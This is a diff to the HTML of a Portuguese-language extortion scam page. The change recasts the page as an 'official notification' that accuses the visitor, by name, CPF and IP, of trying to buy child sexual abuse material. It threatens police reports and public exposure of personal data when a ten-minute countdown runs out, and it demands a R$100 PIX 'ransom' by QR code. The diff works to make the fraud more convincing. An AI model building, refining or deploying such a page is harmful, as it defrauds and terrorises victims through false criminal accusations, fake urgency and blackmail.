@@ -3,7 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>VOCÊ FOI PEGO NO FLAGRANTE</title>
+  <title>NOTIFICAÇÃO OFICIAL - ATIVIDADE SUSPEITA DETECTADA</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     * {
       margin: 0;
@@ -12,249 +15,396 @@
     }
     
     html, body {
-      background: #000;
-      color: #fff;
-      font-family: Arial, sans-serif;
+      background: #f8f9fa;
+      color: #212529;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       font-size: 16px;
-      line-height: 1.5;
+      line-height: 1.6;
       width: 100%;
       min-height: 100vh;
       overflow-x: hidden;
-      padding: 15px;
+      padding: 20px;
     }
     
     .container {
       width: 100%;
-      max-width: 100%;
-      background: #000;
-      padding: 15px;
-      text-align: center;
+      max-width: 800px;
+      background: #ffffff;
+      border: 1px solid #dee2e6;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      padding: 40px;
+      text-align: left;
       margin: 0 auto;
     }
     
-    .main-title {
-      font-size: 28px;
-      font-weight: bold;
-      color: #FF0000;
-      margin-bottom: 20px;
-      text-transform: uppercase;
+    .header {
       text-align: center;
+      margin-bottom: 40px;
+      padding-bottom: 30px;
+      border-bottom: 2px solid #dc3545;
+    }
+    
+    .main-title {
+      font-size: 24px;
+      font-weight: 800;
+      color: #dc3545;
+      margin-bottom: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .subtitle {
+      font-size: 14px;
+      color: #6c757d;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .section {
+      margin-bottom: 35px;
+      padding: 25px;
+      background: #f8f9fa;
+      border-left: 4px solid #dc3545;
+      border-radius: 4px;
+    }
+    
+    .section-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #dc3545;
+      margin-bottom: 15px;
+      text-transform: uppercase;
     }
     
     .intro-text {
-      font-size: 20px;
-      font-weight: bold;
-      color: #ffffff;
+      font-size: 16px;
+      font-weight: 600;
+      color: #212529;
       margin-bottom: 20px;
-      text-align: center;
+      line-height: 1.7;
     }
     
     .accusation-text {
-      font-size: 18px;
-      color: #ffffff;
+      font-size: 15px;
+      color: #495057;
       margin-bottom: 20px;
+      line-height: 1.7;
+    }
+    
+    .highlight-text {
+      font-size: 18px;
+      font-weight: 700;
+      color: #dc3545;
       text-align: center;
-      line-height: 1.6;
+      margin: 25px 0;
+      padding: 15px;
+      background: #fff5f5;
+      border: 2px solid #dc3545;
+      border-radius: 6px;
+    }
+    
+    .crime-details {
+      background: #fff3cd;
+      border: 1px solid #ffeaa7;
+      border-radius: 6px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+    
+    .crime-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #856404;
+      margin-bottom: 10px;
+    }
+    
+    .crime-text {
+      font-size: 15px;
+      color: #856404;
+      font-weight: 600;
     }
     
     .evidence-section {
-      background: #1a1a1a;
-      padding: 15px;
-      border-left: 4px solid #FF0000;
-      margin: 20px 0;
-      text-align: center;
+      background: #e9ecef;
+      padding: 25px;
+      border-radius: 6px;
+      margin: 25px 0;
     }
     
     .evidence-title {
-      font-size: 18px;
-      font-weight: bold;
-      color: #FF0000;
-      margin-bottom: 12px;
-      text-align: center;
+      font-size: 16px;
+      font-weight: 700;
+      color: #495057;
+      margin-bottom: 15px;
+      text-transform: uppercase;
     }
     
     .evidence-list {
       list-style: none;
       padding: 0;
-      text-align: center;
     }
     
     .evidence-list li {
-      font-size: 15px;
-      color: #ffffff;
-      margin: 6px 0;
-      text-align: center;
+      font-size: 14px;
+      color: #495057;
+      margin: 8px 0;
+      padding-left: 20px;
+      position: relative;
+      font-weight: 500;
     }
     
     .evidence-list li::before {
-      content: "• ";
-      color: #FF0000;
+      content: "•";
+      color: #dc3545;
       font-weight: bold;
+      position: absolute;
+      left: 0;
     }
     
-    .crime-warning {
-      font-size: 20px;
-      font-weight: bold;
-      color: #FF0000;
+    .warning-section {
+      background: #d1ecf1;
+      border: 1px solid #bee5eb;
+      border-radius: 6px;
+      padding: 25px;
       margin: 25px 0;
       text-align: center;
     }
     
-    .exposure-warning {
+    .warning-title {
       font-size: 18px;
-      color: #ffffff;
-      margin: 20px 0;
-      text-align: center;
+      font-weight: 700;
+      color: #0c5460;
+      margin-bottom: 15px;
+      text-transform: uppercase;
     }
     
-    .countdown-section {
-      background: #1a1a1a;
-      border: 2px solid #FF0000;
-      padding: 20px;
-      margin: 25px 0;
-      text-align: center;
+    .warning-text {
+      font-size: 15px;
+      color: #0c5460;
+      font-weight: 600;
     }
     
-    .countdown-label {
-      font-size: 18px;
-      color: #ffffff;
-      margin-bottom: 12px;
-      text-align: center;
-    }
-    
-    .countdown {
-      font-size: 40px;
-      font-weight: bold;
-      font-family: 'Courier New', monospace;
-      background: #000;
-      color: #FF0000;
-      padding: 15px 25px;
-      border-radius: 5px;
-      display: inline-block;
-      letter-spacing: 2px;
-      text-shadow: 0 0 10px #FF0000;
-    }
-    
-    .countdown-warning {
-      font-size: 16px;
-      color: #ffffff;
-      margin-top: 12px;
-      font-style: italic;
-      text-align: center;
-    }
-    
-    .qr-section {
+    .solution-section {
+      background: #d4edda;
+      border: 2px solid #28a745;
+      border-radius: 8px;
+      padding: 30px;
       margin: 30px 0;
       text-align: center;
-      padding: 20px;
-      border: 2px solid #ffff00;
-      background: rgba(255, 255, 0, 0.1);
     }
     
-    .qr-title {
+    .solution-title {
       font-size: 20px;
-      font-weight: bold;
-      color: #ffff00;
-      margin-bottom: 15px;
+      font-weight: 700;
+      color: #155724;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+    }
+    
+    .solution-text {
+      font-size: 16px;
+      color: #155724;
+      margin-bottom: 25px;
+      font-weight: 600;
+      line-height: 1.7;
+    }
+    
+    .pix-section {
+      background: #ffffff;
+      border: 3px solid #28a745;
+      border-radius: 10px;
+      padding: 30px;
+      margin: 25px 0;
+      text-align: center;
+      box-shadow: 0 4px 8px rgba(40, 167, 69, 0.2);
+    }
+    
+    .pix-title {
+      font-size: 22px;
+      font-weight: 800;
+      color: #28a745;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
     }
     
     .qr-code-container {
-      margin: 20px 0;
+      margin: 25px 0;
       display: flex;
       justify-content: center;
       align-items: center;
     }
     
     .qr-code-image {
-      max-width: 200px;
-      max-height: 200px;
-      border: 2px solid #ffffff;
+      max-width: 220px;
+      max-height: 220px;
+      border: 3px solid #28a745;
       background: white;
-      padding: 10px;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
     }
     
     .pix-code-section {
-      margin-top: 20px;
+      margin-top: 25px;
     }
     
     .pix-code-label {
       font-size: 16px;
-      color: #ffffff;
+      color: #495057;
       margin-bottom: 10px;
+      font-weight: 600;
     }
     
     .pix-code {
       font-family: 'Courier New', monospace;
       font-size: 12px;
-      color: #ffff00;
-      background: rgba(0, 0, 0, 0.5);
-      padding: 10px;
-      border: 1px solid #cccccc;
+      color: #495057;
+      background: #f8f9fa;
+      padding: 15px;
+      border: 2px solid #dee2e6;
+      border-radius: 6px;
       word-break: break-all;
-      margin-bottom: 10px;
+      margin-bottom: 15px;
+      font-weight: 500;
     }
     
     .loading-qr {
-      color: #ffff00;
+      color: #28a745;
       font-size: 16px;
       margin: 20px 0;
+      font-weight: 600;
     }
     
     .error-qr {
-      color: #ff0000;
+      color: #dc3545;
       font-size: 14px;
       margin: 20px 0;
+      font-weight: 600;
+    }
+    
+    .countdown-section {
+      background: #f8d7da;
+      border: 2px solid #dc3545;
+      border-radius: 8px;
+      padding: 25px;
+      margin: 30px 0;
+      text-align: center;
+    }
+    
+    .countdown-label {
+      font-size: 16px;
+      color: #721c24;
+      margin-bottom: 15px;
+      font-weight: 600;
+    }
+    
+    .countdown {
+      font-size: 36px;
+      font-weight: 800;
+      font-family: 'Inter', monospace;
+      background: #dc3545;
+      color: #ffffff;
+      padding: 15px 30px;
+      border-radius: 8px;
+      display: inline-block;
+      letter-spacing: 2px;
+      box-shadow: 0 4px 8px rgba(220, 53, 69, 0.3);
+    }
+    
+    .countdown-warning {
+      font-size: 14px;
+      color: #721c24;
+      margin-top: 15px;
+      font-weight: 500;
+      font-style: italic;
+    }
+    
+    .final-warning {
+      background: #f8d7da;
+      border: 2px solid #dc3545;
+      border-radius: 8px;
+      padding: 30px;
+      margin: 30px 0;
+      text-align: center;
+    }
+    
+    .final-warning-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #721c24;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+    }
+    
+    .final-warning-text {
+      font-size: 15px;
+      color: #721c24;
+      margin: 10px 0;
+      font-weight: 600;
+      line-height: 1.6;
+    }
+    
+    .exposure-list {
+      list-style: none;
+      padding: 0;
+      text-align: left;
+      max-width: 500px;
+      margin: 20px auto;
+    }
+    
+    .exposure-list li {
+      font-size: 15px;
+      color: #721c24;
+      margin: 8px 0;
+      padding-left: 25px;
+      position: relative;
+      font-weight: 600;
+    }
+    
+    .exposure-list li::before {
+      content: "⚠️";
+      position: absolute;
+      left: 0;
     }
     
     /* Mobile responsiveness */
     @media (max-width: 768px) {
       body {
-        font-size: 14px;
         padding: 10px;
       }
       
       .container {
-        padding: 10px;
+        padding: 20px;
       }
       
       .main-title {
-        font-size: 22px;
+        font-size: 20px;
       }
       
       .intro-text {
-        font-size: 16px;
+        font-size: 14px;
       }
       
       .countdown {
         font-size: 28px;
-        padding: 10px 15px;
+        padding: 12px 20px;
       }
       
-      .pix-info {
+      .pix-title {
         font-size: 18px;
       }
       
-      .qr-section {
-        margin: 20px 0;
-        padding: 15px;
-      }
-      
-      .qr-title {
-        font-size: 16px;
-      }
-      
       .qr-code-image {
-        max-width: 150px;
-        max-height: 150px;
+        max-width: 180px;
+        max-height: 180px;
       }
       
       .pix-code {
         font-size: 10px;
-        padding: 8px;
-      }
-      
-      .pix-code-label {
-        font-size: 14px;
+        padding: 12px;
       }
     }
     
@@ -278,22 +428,32 @@
 </head>
 <body>
   <div class="container">
-    <div class="main-title">
-      🚨 VOCÊ FOI PEGO NO FLAGRANTE
+    <div class="header">
+      <div class="main-title">
+        🚨 VOCÊ FOI PEGO NO FLAGRANTE 🚨
+      </div>
+      <div class="subtitle">
+        NOTIFICAÇÃO OFICIAL - ATIVIDADE SUSPEITA DETECTADA
+      </div>
     </div>
     
-    <div class="intro-text">
-      <strong><span id="nome-cliente">[CARREGANDO NOME...]</span></strong>,<br>
-      a gente rastreou sua tentativa de comprar conteúdo proibido com menores de idade.
+    <div class="section">
+      <div class="intro-text">
+        <strong>Olá <span id="nome-cliente">[CARREGANDO NOME...]</span>, portador do CPF: <span id="cpf-cliente">[CARREGANDO CPF...]</span></strong>
+      </div>
+      <div class="accusation-text">
+        A gente rastreou sua tentativa de comprar conteúdo proibido com menores de idade.<br>
+        Você acessou isso às <strong><span id="hora-tentativa">[CARREGANDO...]</span></strong>, usando o IP <strong><span id="ip-cliente">[CARREGANDO IP...]</span></strong>.
+      </div>
     </div>
     
-    <div class="accusation-text">
-      Você acessou isso às <strong><span id="hora-tentativa">[CARREGANDO...]</span></strong>, usando o IP <strong><span id="ip-cliente">[CARREGANDO IP...]</span></strong>, e a porra do CPF <strong><span id="cpf-cliente">[CARREGANDO CPF...]</span></strong> tá amarrado junto.
-      <br><br>
-      <strong style="color: #FF0000;">E A GENTE GRAVOU TUDO.</strong>
-      <br><br>
-      <strong>ISSO É CRIME FEDERAL - ARTIGO 241-A DO ECA</strong><br>
-      <strong>PENA: 3 A 6 ANOS DE PRISÃO + MULTA</strong>
+    <div class="highlight-text">
+      E FOI TUDO GRAVADO.
+    </div>
+    
+    <div class="crime-details">
+      <div class="crime-title">ISSO É CRIME FEDERAL - ARTIGO 241-A DO ECA</div>
+      <div class="crime-text">PENA: 3 A 6 ANOS DE PRISÃO + MULTA</div>
     </div>
     
     <div class="evidence-section">
@@ -307,57 +467,67 @@
       </ul>
     </div>
     
-    <div class="crime-warning">
-      VOCÊ SERÁ DENUNCIADO À POLÍCIA FEDERAL<br>
-      SEUS DADOS VÃO PARA O MINISTÉRIO PÚBLICO
+    <div class="warning-section">
+      <div class="warning-title">VOCÊ SERÁ DENUNCIADO À POLÍCIA FEDERAL</div>
+      <div class="warning-text">SEUS DADOS VÃO PARA O MINISTÉRIO PÚBLICO</div>
     </div>
     
-    <div class="exposure-warning">
-      Esse caso vai ser publicado em sites de denúncia, grupos de WhatsApp, Facebook e enviado para seus contatos, daqui a:
+    <div class="solution-section">
+      <div class="solution-title">SOLUÇÃO DISPONÍVEL</div>
+      <div class="solution-text">
+        A menos que compre pelo nosso silêncio.
+      </div>
+      
+      <div class="pix-section">
+        <div class="pix-title">PIX DE RESGATE - R$ 100,00</div>
+        
+        <div id="qr-loading" class="loading-qr">
+          Gerando QR code PIX...
+        </div>
+        
+        <div id="qr-container" class="qr-code-container" style="display: none;">
+          <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
+        </div>
+        
+        <div id="pix-code-container" class="pix-code-section" style="display: none;">
+          <div class="pix-code-label">Código PIX (Copia e Cola):</div>
+          <div id="pix-code" class="pix-code"></div>
+          <div style="font-size: 14px; color: #6c757d; margin-top: 10px;">
+            Copie o código acima ou escaneie o QR code
+          </div>
+        </div>
+        
+        <div id="qr-error" class="error-qr" style="display: none;">
+          Erro ao gerar QR code. Tente recarregar a página.
+        </div>
+      </div>
+      
+      <div class="solution-text">
+        <strong>Pague e apagamos seu nome, CPF e dados do nosso banco de dados.<br>
+        Não pague e espere a polícia bater na sua porta.</strong>
+      </div>
     </div>
     
     <div class="countdown-section">
-      <div class="countdown-label">🕒</div>
+      <div class="countdown-label">⏰ TEMPO RESTANTE PARA EXPOSIÇÃO PÚBLICA</div>
       <div class="countdown" id="contador">10:00</div>
       <div class="countdown-warning">
         (esse tempo NÃO reinicia, nem se você sair. Zerou, já era.)
       </div>
     </div>
     
-    <div class="crime-warning">
-      QUANDO O TEMPO ACABAR, TODOS OS SEUS DADOS VÃO SER EXPOSTOS:
-    </div>
-    
-    <ul class="evidence-list">
-      <li>Seu nome e CPF completo</li>
-      <li>Endereço residencial</li>
-      <li>Telefone e e-mail</li>
-      <li>Fotos das tentativas de compra</li>
-      <li>Histórico de navegação</li>
-      <li>Associados a crimes cibernéticos</li>
-    </ul>
-    
-    <div class="qr-section">
-      <div class="qr-title">PIX DE RESGATE - R$ 100,00</div>
-      
-      <div id="qr-loading" class="loading-qr">
-        Gerando QR code PIX...
-      </div>
-      
-      <div id="qr-container" class="qr-code-container" style="display: none;">
-        <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
-      </div>
-      
-      <div id="pix-code-container" class="pix-code-section" style="display: none;">
-        <div class="pix-code-label">Código PIX (Copia e Cola):</div>
-        <div id="pix-code" class="pix-code"></div>
-        <div style="font-size: 12px; color: #cccccc; margin-top: 10px;">
-          Copie o código acima ou escaneie o QR code
-        </div>
-      </div>
-      
-      <div id="qr-error" class="error-qr" style="display: none;">
-        Erro ao gerar QR code. Tente recarregar a página.
+    <div class="final-warning">
+      <div class="final-warning-title">QUANDO O TEMPO ACABAR, TODOS OS SEUS DADOS VÃO SER EXPOSTOS:</div>
+      <ul class="exposure-list">
+        <li>Seu nome e CPF completo</li>
+        <li>Endereço residencial</li>
+        <li>Telefone e e-mail</li>
+        <li>Fotos das tentativas de compra</li>
+        <li>Histórico de navegação</li>
+        <li>Associados a crimes cibernéticos</li>
+      </ul>
+      <div class="final-warning-text">
+        <strong>Esta é sua última oportunidade de resolver isso discretamente.</strong>
       </div>
     </div>
   </div>
